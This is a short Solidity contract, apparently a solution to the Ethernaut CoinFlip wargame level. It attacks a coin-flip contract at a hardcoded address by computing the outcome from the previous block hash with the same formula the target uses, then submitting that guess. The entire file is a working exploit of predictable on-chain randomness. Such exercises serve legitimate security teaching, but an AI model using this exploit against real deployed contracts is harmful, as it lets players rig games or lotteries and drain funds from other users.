// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip  {
  function flip(bool _guess) external returns (bool);
}

contract Attacknaut {
    uint256 public consecutiveWins = 0;

    ICoinFlip coinFlipContract = ICoinFlip(0x322834c562969b4ebe43E35e48e2c3A21db22881);
    uint256 lastHash;

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function guess() public returns (uint256) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side) {
            coinFlipContract.flip(true);
            consecutiveWins++;
        } else {
            coinFlipContract.flip(false);
            consecutiveWins++;
        }
        return consecutiveWins;
    }   
}
